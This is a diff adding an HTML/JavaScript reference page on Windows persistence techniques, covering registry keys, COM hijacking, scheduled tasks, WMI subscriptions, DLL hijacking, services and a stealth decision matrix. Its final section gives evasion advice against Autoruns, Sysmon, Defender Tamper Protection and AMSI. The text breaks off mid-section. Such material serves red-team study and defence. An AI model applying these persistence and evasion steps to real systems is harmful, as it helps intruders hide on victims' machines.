@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Persistence Techniques Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#34d399,#60a5fa,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+var SE=[
+{id:"reg",l:"A. Registry",i:"\u{1F4DD}",c:"#f87171"},
+{id:"tsk",l:"B. Sched Tasks",i:"\u{1F552}",c:"#60a5fa"},
+{id:"wmi",l:"C. WMI Events",i:"\u{1F50C}",c:"#a78bfa"},
+{id:"dll",l:"D. DLL-Based",i:"\u{1F4E6}",c:"#fbbf24"},
+{id:"boo",l:"E. Boot/Logon",i:"\u{1F511}",c:"#34d399"},
+{id:"svc",l:"F. Services",i:"\u2699\uFE0F",c:"#f59e0b"},
+{id:"adv",l:"G. Advanced",i:"\u{1F9E0}",c:"#e879f9"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+
+var S={s:'reg',t:'flow'};
+
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+
+function fREG(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">REGISTRY PERSISTENCE LOCATIONS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3C3}","Run / RunOnce Keys","#f87171",
+'<div style="margin-bottom:4px">Execute on every logon (Run) or once then deleted (RunOnce).</div>'+
+F("HKCU","Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","")+
+F("HKLM","Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","")+
+F("HKCU","...\\\\RunOnce","One-shot, auto-deleted")+
+F("HKLM","...\\\\RunOnce","Needs admin for HKLM")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Heavily monitored by all EDRs</div>');
+h+=CRD("\u{1F504}","COM Hijacking (InprocServer32)","#f87171",
+'<div style="margin-bottom:4px">Redirect COM object to your DLL. Triggered when app loads that CLSID.</div>'+
+F("HKCU","Software\\\\Classes\\\\CLSID\\\\{CLSID}\\\\InprocServer32","")+
+F("","(Default) = path\\\\to\\\\payload.dll","")+
+F("","ThreadingModel = Both","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 HKCU overrides HKLM. No admin needed. Triggered by normal apps.</div>');
+h+=CRD("\u{1F4E6}","AppInit_DLLs","#f87171",
+'<div style="margin-bottom:4px">DLL loaded into every process that loads user32.dll.</div>'+
+F("HKLM","...\\\\Windows NT\\\\CurrentVersion\\\\Windows","")+
+F("","AppInit_DLLs = path\\\\to\\\\dll","")+
+F("","LoadAppInit_DLLs = 1","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Disabled if SecureBoot enabled. Admin required. Very noisy.</div>');
+h+=CRD("\u{1F527}","IFEO (Image File Execution Options)","#f87171",
+'<div style="margin-bottom:4px">Set debugger for any executable. Runs your binary instead of target.</div>'+
+F("HKLM","...\\\\Image File Execution Options\\\\target.exe","")+
+F("","Debugger = C:\\\\path\\\\payload.exe","")+
+F("","Or: GlobalFlag for silent monitoring","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Also supports SilentProcessExit monitoring for cleanup.</div>');
+h+=CRD("\u{1F50D}","Winlogon","#f87171",
+'<div style="margin-bottom:4px">Shell and Userinit execute during logon sequence.</div>'+
+F("HKLM","...\\\\Winlogon\\\\Shell","Default: explorer.exe")+
+F("HKLM","...\\\\Winlogon\\\\Userinit","Default: userinit.exe,")+
+F("","Append: ,C:\\\\path\\\\payload.exe","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Replacing Shell breaks desktop. Append to Userinit instead.</div>');
+h+=CRD("\u{1F5A5}\uFE0F","ScreenSaver","#f87171",
+'<div style="margin-bottom:4px">Screensaver executable runs after idle timeout.</div>'+
+F("HKCU","Control Panel\\\\Desktop\\\\SCRNSAVE.EXE","payload path")+
+F("HKCU","...\\\\ScreenSaveActive","1")+
+F("HKCU","...\\\\ScreenSaveTimeOut","60 (seconds)")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 User-level, no admin. Fires on idle.</div>');
+h+='</div>';return h;
+}
+
+function fTSK(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">SCHEDULED TASK PERSISTENCE</div>';
+h+='<div class="fr">';
+h+=B("Create Task","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","schtasks.exe /create")+F("","COM ITaskService::RegisterTaskDefinition")+F("","Direct XML in C:\\\\Windows\\\\System32\\\\Tasks")+F("","PowerShell Register-ScheduledTask")+'</div>',220);
+h+=A("trigger");
+h+=B("Trigger Types","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","TASK_TRIGGER_LOGON","On logon")+F("","TASK_TRIGGER_BOOT","At startup")+F("","TASK_TRIGGER_TIME","At specific time")+F("","TASK_TRIGGER_EVENT","On event log entry")+F("","TASK_TRIGGER_IDLE","On idle")+F("","TASK_TRIGGER_REGISTRATION","On creation")+'</div>',220);
+h+=A("action");
+h+=B("Action","#60a5fa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","TASK_ACTION_EXEC","Run executable")+F("","TASK_ACTION_COM_HANDLER","Load COM object")+F("","Path + arguments","")+F("","Working directory","")+'</div>',200);
+h+='</div>';
+h+=N("STEALTH","#60a5fa","COM API leaves fewer logs than schtasks.exe. Task XML files in System32\\\\Tasks can be directly written. Hidden tasks: set SD to deny read, or use TASK_LOGON_S4U for invisible user context.");
+return h;
+}
+
+function fWMI(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">WMI EVENT SUBSCRIPTION PERSISTENCE</div>';
+h+='<div style="margin-bottom:6px;font-size:.72em;color:#6b7280">Three components bound together. All stored in WMI repository (OBJECTS.DATA). Survives reboots.</div>';
+h+='<div class="fr">';
+h+=B("Event Filter","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","__EventFilter","")+F("","WQL query defines trigger:")+F("","SELECT * FROM __InstanceModificationEvent")+F("","WITHIN 60 WHERE TargetInstance ISA")+F("","  \'Win32_PerfFormattedData_PerfOS_System\'")+F("","Or: Win32_ProcessStartTrace for process start")+'</div>',260);
+h+=A("triggers");
+h+=B("Event Consumer","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","CommandLineEventConsumer","Run exe")+F("","ActiveScriptEventConsumer","VBScript/JScript")+F("","LogFileEventConsumer","Write to file")+F("","NTEventLogEventConsumer","Write event log")+F("","SMTPEventConsumer","Send email")+'</div>',240);
+h+=A("binds");
+h+=B("Filter-to-Consumer Binding","#a78bfa",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","__FilterToConsumerBinding","")+F("","Links filter + consumer","")+F("","System stores in repository","")+F("","Executes as SYSTEM","")+F("","Survives reboot","")+'</div>',220);
+h+='</div>';
+h+=N("DETECTION","#a78bfa","WMI subscriptions stored in C:\\\\Windows\\\\System32\\\\wbem\\\\Repository\\\\OBJECTS.DATA. Tools: Autoruns, Get-WMIObject __FilterToConsumerBinding. Sysmon Event ID 19/20/21.");
+return h;
+}
+
+function fDLL(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">DLL-BASED PERSISTENCE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F50D}","DLL Search Order Hijacking","#fbbf24",
+'<div style="margin-bottom:4px">Place DLL where app searches before legit location. App loads yours first.</div>'+
+F("1","App directory (highest priority)","")+
+F("2","System32","")+
+F("3","System16","")+
+F("4","Windows directory","")+
+F("5","Current directory","")+
+F("6","PATH directories","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Drop DLL in app dir. No registry changes. Triggered by normal app launch.</div>');
+h+=CRD("\u{1F47B}","Phantom DLL Loading","#fbbf24",
+'<div style="margin-bottom:4px">Many Windows apps try to load DLLs that don\'t exist. Supply the missing DLL.</div>'+
+F("","Common phantoms: version.dll, userenv.dll","")+
+F("","wtsapi32.dll, dbghelp.dll, MSASN1.dll","")+
+F("","Use Process Monitor to find LoadLibrary fails","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No existing file replaced. Clean. Export forwarding for compat.</div>');
+h+=CRD("\u{1F4DA}","DLL Side-Loading","#fbbf24",
+'<div style="margin-bottom:4px">Abuse signed application that loads a specific DLL from its directory.</div>'+
+F("","Copy signed exe + your DLL to writable dir","")+
+F("","DLL name must match what exe imports","")+
+F("","Signed exe provides cover for execution","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Execution under signed process. AppLocker/WDAC may allow.</div>');
+h+=CRD("\u{1F5C3}\uFE0F","KnownDLLs Override","#fbbf24",
+'<div style="margin-bottom:4px">HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\KnownDLLs. Admin + reboot required.</div>'+
+F("","Add entry: MyDll = payload.dll","")+
+F("","System pre-loads at boot","")+
+F("","Or: remove entry to force search order","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Admin + reboot. Monitored by EDRs.</div>');
+h+='</div>';return h;
+}
+
+function fBOO(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">BOOT & LOGON PERSISTENCE</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4C1}","Startup Folder","#34d399",
+'<div style="margin-bottom:4px">Drop shortcut (.lnk) or executable in startup folder.</div>'+
+F("User","%APPDATA%\\\\...\\\\Start Menu\\\\Programs\\\\Startup","")+
+F("All","C:\\\\ProgramData\\\\...\\\\Start Menu\\\\Programs\\\\Startup","")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 Very visible. Checked by Autoruns. User-level.</div>');
+h+=CRD("\u{1F511}","Winlogon Helper","#34d399",
+'<div style="margin-bottom:4px">Winlogon loads Shell and Userinit on every logon.</div>'+
+F("","Shell = explorer.exe, C:\\\\payload.exe","")+
+F("","Userinit = C:\\\\Windows\\\\...\\\\userinit.exe, C:\\\\payload.exe","")+
+F("","Notify subkey (pre-Vista) for DLL load","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Runs as user during logon. Append, don\'t replace.</div>');
+h+=CRD("\u267F","Accessibility Features","#34d399",
+'<div style="margin-bottom:4px">Replace accessibility executables. Triggered from lock screen.</div>'+
+F("","sethc.exe","Sticky Keys (5x Shift)")+
+F("","utilman.exe","Win+U")+
+F("","osk.exe","On-screen keyboard")+
+F("","narrator.exe","Narrator")+
+F("","magnify.exe","Magnifier")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Execute from lock screen without logging in. SYSTEM context.</div>');
+h+=CRD("\u{1F310}","Logon Scripts","#34d399",
+'<div style="margin-bottom:4px">Scripts execute during user logon via GP or registry.</div>'+
+F("Reg","...\\\\Environment\\\\UserInitMmprLogonScript","")+
+F("GP","\\\\SYSVOL\\\\...\\\\Scripts\\\\Logon\\\\","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 UserInitMmprLogonScript is less monitored than Run keys.</div>');
+h+=CRD("\u{1F516}","Active Setup","#34d399",
+'<div style="margin-bottom:4px">One-time per-user execution. HKLM key runs StubPath for each new user.</div>'+
+F("HKLM","Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{GUID}","")+
+F("","StubPath = C:\\\\payload.exe","")+
+F("","Version = 1 (increment to re-trigger)","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Runs once per user profile. Good for lateral spread.</div>');
+h+=CRD("\u{1F4BE}","Bootkit / VBR / MBR","#34d399",
+'<div style="margin-bottom:4px">Modify boot record for pre-OS persistence. Requires raw disk access.</div>'+
+F("","MBR: sector 0 of disk","")+
+F("","VBR: volume boot record","")+
+F("","UEFI: EFI System Partition bootloader","")+
+'<div style="font-size:.88em;color:#e879f9;margin-top:4px">\u26A0 Secure Boot blocks unsigned UEFI. Very advanced. Kernel-level.</div>');
+h+='</div>';return h;
+}
+function fSVC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">SERVICE-BASED PERSISTENCE</div>';
+h+='<div class="grd">';
+h+=CRD("\u2699\uFE0F","Create New Service","#f59e0b",
+'<div style="margin-bottom:4px">sc.exe create or CreateService API. Runs as SYSTEM.</div>'+
+F("","sc create MySvc binPath= C:\\\\payload.exe","")+
+F("","start= auto (SERVICE_AUTO_START)","")+
+F("","type= own (SERVICE_WIN32_OWN_PROCESS)","")+
+F("","Registry: HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\MySvc","")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Admin required. Event 7045 logged. Autoruns visible.</div>');
+h+=CRD("\u{1F4E6}","Service DLL (svchost)","#f59e0b",
+'<div style="margin-bottom:4px">Register DLL as svchost service. Blends with existing services.</div>'+
+F("","ServiceDll = C:\\\\path\\\\payload.dll","under Parameters key")+
+F("","Type = 0x20 (SERVICE_WIN32_SHARE_PROCESS)","")+
+F("","ImagePath = %SystemRoot%\\\\System32\\\\svchost.exe -k grp","")+
+F("","Add service name to svchost group in registry","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Runs inside svchost.exe. Looks legitimate. SYSTEM context.</div>');
+h+=CRD("\u{1F527}","Modify Existing Service","#f59e0b",
+'<div style="margin-bottom:4px">Change binPath of disabled or rarely-used service.</div>'+
+F("","sc config TargetSvc binPath= C:\\\\payload.exe","")+
+F("","sc config TargetSvc start= auto","")+
+F("","Or modify ServiceDll in Parameters subkey","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No Event 7045 (service creation). Subtle. Pick dormant service.</div>');
+h+=CRD("\u{1F4BB}","Driver Service (Kernel)","#f59e0b",
+'<div style="margin-bottom:4px">Load kernel driver for ring-0 persistence. Requires signing or BYOVD.</div>'+
+F("","type= kernel (SERVICE_KERNEL_DRIVER)","")+
+F("","Needs valid signature (or test signing mode)","")+
+F("","BYOVD: load legit vuln driver, exploit it","")+
+'<div style="font-size:.88em;color:#e879f9;margin-top:4px">\u26A0 DSE enforcement. Secure Boot. Very advanced.</div>');
+h+='</div>';return h;
+}
+
+function fADV(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">ADVANCED PERSISTENCE TECHNIQUES</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F3AD}","COM Object Hijacking","#e879f9",
+'<div style="margin-bottom:4px">HKCU CLSID overrides HKLM. No admin needed. Triggered by normal apps.</div>'+
+F("","Find frequently loaded CLSIDs (Process Monitor)","")+
+F("","Create HKCU\\\\...\\\\CLSID\\\\{target}\\\\InprocServer32","")+
+F("","(Default) = payload.dll, ThreadingModel = Both","")+
+F("","Proxy DLL: forward exports to original + run code","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 User-level. Triggered by Explorer, Office, etc. Very stealthy.</div>');
+h+=CRD("\u{1F4DA}","AppDomainManager Injection","#e879f9",
+'<div style="margin-bottom:4px">.NET apps load AppDomainManager from config. DLL executes in CLR context.</div>'+
+F("","Create app.exe.config or machine.config","")+
+F("","appDomainManagerAssembly = payload","")+
+F("","appDomainManagerType = ManagerClass","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No process creation. Runs inside legitimate .NET app.</div>');
+h+=CRD("\u{1F5A8}\uFE0F","Print Monitor / Port Monitor","#e879f9",
+'<div style="margin-bottom:4px">Register DLL as print monitor. Loaded by spoolsv.exe (SYSTEM).</div>'+
+F("HKLM","...\\\\Print\\\\Monitors\\\\MyMon","")+
+F("","Driver = payload.dll","")+
+F("","Loaded by Spooler service at boot","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 SYSTEM context. Less monitored than Run keys.</div>');
+h+=CRD("\u{1F4D1}","TypeLib Hijacking","#e879f9",
+'<div style="margin-bottom:4px">Redirect TypeLib reference to payload. Triggered when COM type is resolved.</div>'+
+F("HKCU","Software\\\\Classes\\\\TypeLib\\\\{GUID}\\\\1.0\\\\0\\\\win64","")+
+F("","(Default) = C:\\\\path\\\\payload.dll","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 HKCU, no admin. Obscure. Triggered by Office macros, scripts.</div>');
+h+=CRD("\u{1F4C3}","Office Template Persistence","#e879f9",
+'<div style="margin-bottom:4px">Modify Normal.dotm or add-in for Word/Excel persistence.</div>'+
+F("","Normal.dotm with VBA macro","")+
+F("","XLSTART folder for Excel add-ins","")+
+F("","HKCU\\\\Software\\\\Microsoft\\\\Office\\\\...\\\\OPEN","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Fires on every Office app open. User-level.</div>');
+h+=CRD("\u{1F50C}","Netsh Helper DLL","#e879f9",
+'<div style="margin-bottom:4px">Register DLL as netsh helper. Loaded when netsh.exe runs.</div>'+
+F("HKLM","Software\\\\Microsoft\\\\NetSh","")+
+F("","MyHelper = C:\\\\path\\\\helper.dll","")+
+F("","DLL loaded by any netsh invocation","")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Triggered by network config scripts, Group Policy refresh.</div>');
+h+='</div>';return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">PERSISTENCE DECISION MATRIX</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var items=[
+{n:"Registry Run Key",priv:"User",surv:"Logon",stealth:"\u2B50",det:"High",c:"#f87171"},
+{n:"COM Hijack (HKCU)",priv:"User",surv:"App Launch",stealth:"\u2B50\u2B50\u2B50",det:"Low",c:"#34d399"},
+{n:"Scheduled Task (COM)",priv:"User/Admin",surv:"Boot/Logon/Time",stealth:"\u2B50\u2B50",det:"Medium",c:"#60a5fa"},
+{n:"WMI Subscription",priv:"Admin",surv:"Boot+60s",stealth:"\u2B50\u2B50\u2B50",det:"Medium",c:"#a78bfa"},
+{n:"Service DLL (svchost)",priv:"Admin",surv:"Boot",stealth:"\u2B50\u2B50\u2B50",det:"Low",c:"#34d399"},
+{n:"DLL Search Order Hijack",priv:"User",surv:"App Launch",stealth:"\u2B50\u2B50\u2B50",det:"Low",c:"#34d399"},
+{n:"Print Monitor",priv:"Admin",surv:"Boot",stealth:"\u2B50\u2B50\u2B50",det:"Low",c:"#34d399"},
+{n:"AppDomainManager",priv:"User",surv:"App Launch",stealth:"\u2B50\u2B50\u2B50",det:"Very Low",c:"#34d399"},
+{n:"IFEO Debugger",priv:"Admin",surv:"App Launch",stealth:"\u2B50\u2B50",det:"Medium",c:"#f59e0b"},
+{n:"Accessibility Replace",priv:"Admin",surv:"Lock Screen",stealth:"\u2B50",det:"High",c:"#f87171"},
+{n:"Startup Folder",priv:"User",surv:"Logon",stealth:"\u2B50",det:"Very High",c:"#f87171"},
+{n:"Active Setup",priv:"Admin",surv:"Per-user logon",stealth:"\u2B50\u2B50",det:"Low",c:"#60a5fa"}
+];
+items.forEach(function(x){
+h+='<div style="border-radius:6px;border:1px solid '+x.c+'20;background:'+x.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+x.c+';font-size:.76em">'+x.n+'</span><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">Det: '+x.det+'</span></div><div style="font-size:.66em;color:#9ca3af;margin-top:1px;display:flex;gap:10px"><span>Priv: '+x.priv+'</span><span>Survives: '+x.surv+'</span><span>Stealth: '+x.stealth+'</span></div></div>';
+});
+h+='</div>';
+h+=N("SELECTION STRATEGY","#f472b6","<b>User-level + stealthy:</b> COM hijack, DLL search order, AppDomainManager. <b>Admin + robust:</b> Service DLL, WMI sub, Print Monitor. <b>Layer 2+ mechanisms</b> for redundancy. Always combine with timestomping.");
+return h;
+}
+
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F50D}","Evading Autoruns","#fb923c",
+'<div style="margin-bottom:4px">Autoruns checks common locations. Use less-known paths.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">COM hijack</b><span style="color:#6b7280">Not all CLSIDs checked</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">TypeLib redirect</b><span style="color:#6b7280">Autoruns doesn\'t check TypeLib</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#a78bfa;min-width:130px">AppDomainMgr</b><span style="color:#6b7280">Config-based, no registry entry</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Hidden sched task</b><span style="color:#6b7280">SD ACL denies read access</span></div>');
+h+=CRD("\u{1F4CA}","Sysmon Evasion","#fb923c",
+'<div style="margin-bottom:4px">Sysmon logs registry, process, WMI events. Minimize artifacts.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Event ID 12/13</b><span style="color:#6b7280">Registry create/set. Use direct NT API.</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Event ID 19-21</b><span style="color:#6b7280">WMI events. Minimize WMI use.</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Timestamp</b><span style="color:#6b7280">Timestomp files to blend with OS install date</span></div>');
+h+=CRD("\u{1F6E1}\uFE0F","Tamper Protection","#fb923c",
+'<div style="margin-bottom:4px">Defender Tamper Protection prevents disabling security features.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Can\'t disable</b><span style="color:#6b7280">Registry changes to Defender reverted</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Workaround</b><span style="color:#6b7280">Exclusion paths still work via GP</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Kernel route</b><span style="color:#6b7280">BYOVD to patch WdFilter.sys callbacks</span></div>');
+h+=CRD("\u{1F510}","AMSI for Persistence Scripts","#fb923c",
+'<div style="margin-bottom:4px">AMSI scans PowerShell, VBScript, JScript. Persistence scripts get scanned.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:130px">Patch AMSI</b><span style="color:#6b7280">Before persistence script runs</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:130px">Avoid scripts</b><span style="color:#6b7280">Use compiled DLL/EXE instead</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:130px">Obfuscation</b><span style="color:#6b7280">String manipulation, encoding, reflection</span></div>');
+h+=CRD("\u{1F440}","Event Log Evasion","#fb923c",
+'<div style="margin-bottom:4px">Service creation (7045), task creation (4698), etc. leave logs.</div>'+
